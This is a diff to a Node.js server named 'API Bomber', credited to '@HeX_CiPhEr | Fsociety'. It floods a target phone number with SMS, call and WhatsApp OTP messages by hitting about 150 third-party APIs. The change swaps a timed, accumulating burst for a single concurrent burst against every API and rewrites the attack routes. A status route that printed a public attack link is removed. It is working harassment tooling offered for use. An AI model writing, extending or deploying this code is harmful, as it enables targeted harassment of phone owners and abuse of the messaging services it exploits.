@@ -1,4 +1,4 @@
-// API Bomber - Cumulative Burst (Vercel Compatible)
+// API Bomber - Single Massive Burst (All 150 APIs at Once)
 // @HeX_CiPhEr | Fsociety
 
 const express = require('express');
@@ -10,10 +10,8 @@ app.use(cors());
 app.use(express.json());
 
 // ==================== CONFIG ====================
-const RATE_LIMIT_SECONDS = 5;       // wait between bursts
-const BURST_DURATION = 5;            // seconds per burst
+const RATE_LIMIT_SECONDS = 10;
 const userLastRequest = {};
-const cumulativeStats = {};          // phone -> { sms, calls, whatsapp, total }
 
 // ==================== 150+ APIS ====================
 const APIS = [
@@ -135,7 +133,7 @@ const APIS = [
 function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 function getFormats(phone) { return [phone, "91" + phone, "+91" + phone]; }
 
-// ==================== ATTACK BURST ====================
+// ==================== SEND SINGLE REQUEST ====================
 async function sendRequest(api, phone) {
   try {
     let url = api.url;
@@ -147,45 +145,40 @@ async function sendRequest(api, phone) {
     if (api.data && typeof api.data === 'function') {
       data = api.data(phone);
     }
-    const config = { method: api.method || 'GET', url, headers, timeout: 3000 };
+    const config = { method: api.method || 'GET', url, headers, timeout: 5000 };
     if (data) config.data = data;
     const response = await axios(config);
-    return { status: response.status, name: api.name };
+    return { success: true, status: response.status, name: api.name };
   } catch (error) {
-    return { status: error.response?.status || null, name: api.name };
+    return { success: false, status: error.response?.status || null, name: api.name };
   }
 }
 
-// ==================== RUN BURST AND ACCUMULATE ====================
-async function runBurstAndAccumulate(phone, duration = BURST_DURATION) {
-  let sms = 0, calls = 0, whatsapp = 0, total = 0;
+// ==================== SINGLE MASSIVE BURST (ALL 150 APIs) ====================
+async function runFullBurst(phone) {
   const formats = getFormats(phone);
-  const startTime = Date.now();
-  const endTime = startTime + (duration * 1000);
+  const targetPhone = randomItem(formats);
   
-  while (Date.now() < endTime) {
-    const api = randomItem(APIS);
-    const result = await sendRequest(api, randomItem(formats));
-    if (result.status && [200, 201, 202, 204].includes(result.status)) {
+  // Create an array of promises for all APIs
+  const promises = APIS.map(api => sendRequest(api, targetPhone));
+  
+  // Wait for all to complete (or fail)
+  const results = await Promise.all(promises);
+  
+  // Count successes and failures
+  let sms = 0, calls = 0, whatsapp = 0, total = 0;
+  
+  results.forEach(result => {
+    if (result.success && result.status && [200, 201, 202, 204].includes(result.status)) {
       total++;
       const name = result.name.toLowerCase();
       if (name.includes('call') || name.includes('voice')) calls++;
       else if (name.includes('whatsapp')) whatsapp++;
       else sms++;
     }
-    await new Promise(r => setTimeout(r, 50));
-  }
+  });
   
-  // Accumulate
-  if (!cumulativeStats[phone]) {
-    cumulativeStats[phone] = { sms: 0, calls: 0, whatsapp: 0, total: 0 };
-  }
-  cumulativeStats[phone].sms += sms;
-  cumulativeStats[phone].calls += calls;
-  cumulativeStats[phone].whatsapp += whatsapp;
-  cumulativeStats[phone].total += total;
-  
-  return cumulativeStats[phone];
+  return { sms, calls, whatsapp, total, totalAPIs: APIS.length };
 }
 
 // ==================== ROUTES ====================
@@ -197,85 +190,42 @@ app.get('/', (req, res) => {
     name: 'API Bomber', 
     apis: APIS.length, 
     author: '@HeX_CiPhEr',
-    note: 'Use /start/:phone to attack (refresh to add more)'
+    note: 'Use /start/:phone to send ALL APIs at once'
   });
 });
 
-// START BURST — adds to cumulative count
+// START — Fire ALL APIs in one massive burst
 app.get('/start/:phone', async (req, res) => {
   const phone = req.params.phone;
   if (!phone || !phone.match(/^\d{10}$/)) {
     return res.status(400).json({ error: 'Invalid phone number. Need 10 digits.' });
   }
   
-  // Rate limit per phone
+  // Rate limit
   const now = Date.now();
   if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
     return res.json({ 
-      error: `Wait ${RATE_LIMIT_SECONDS}s between bursts`,
+      error: `Wait ${RATE_LIMIT_SECONDS}s between attacks`,
       wait: RATE_LIMIT_SECONDS,
-      phone: phone,
-      current_stats: cumulativeStats[phone] || { sms: 0, calls: 0, whatsapp: 0, total: 0 }
+      phone: phone
     });
   }
   userLastRequest[phone] = now;
   
-  // Run a burst and add to cumulative
-  const stats = await runBurstAndAccumulate(phone);
+  // Run the full burst
+  const stats = await runFullBurst(phone);
   
   res.json({
     success: true,
     target: phone,
-    stats: stats,
-    note: 'Refresh this URL to add another burst'
-  });
-});
-
-// START BURST with custom duration (max 10s)
-app.get('/start/:phone/:duration', async (req, res) => {
-  const phone = req.params.phone;
-  let duration = parseInt(req.params.duration) || 5;
-  if (duration > 10) duration = 10; // Vercel limit
-  
-  if (!phone || !phone.match(/^\d{10}$/)) {
-    return res.status(400).json({ error: 'Invalid phone number. Need 10 digits.' });
-  }
-  
-  const now = Date.now();
-  if (userLastRequest[phone] && (now - userLastRequest[phone] < RATE_LIMIT_SECONDS * 1000)) {
-    return res.json({ 
-      error: `Wait ${RATE_LIMIT_SECONDS}s between bursts`,
-      wait: RATE_LIMIT_SECONDS,
-      phone: phone,
-      current_stats: cumulativeStats[phone] || { sms: 0, calls: 0, whatsapp: 0, total: 0 }
-    });
-  }
-  userLastRequest[phone] = now;
-  
-  const stats = await runBurstAndAccumulate(phone, duration);
-  
-  res.json({
-    success: true,
-    target: phone,
-    duration: duration + 's burst',
-    stats: stats,
-    note: 'Refresh for more'
-  });
-});
-
-// STATUS — get cumulative count only (no burst)
-app.get('/status/:phone', (req, res) => {
-  const phone = req.params.phone;
-  if (!phone || !phone.match(/^\d{10}$/)) {
-    return res.status(400).json({ error: 'Invalid phone number. Need 10 digits.' });
-  }
-  
-  const stats = cumulativeStats[phone] || { sms: 0, calls: 0, whatsapp: 0, total: 0 };
-  res.json({
-    success: true,
-    target: phone,
-    stats: stats,
-    attack_link: `https://bomber-hex-osint.vercel.app/start/${phone}`
+    total_apis_sent: stats.totalAPIs,
+    stats: {
+      sms: stats.sms,
+      calls: stats.calls,
+      whatsapp: stats.whatsapp,
+      total_success: stats.total
+    },
+    note: 'All APIs fired at once'
   });
 });
 
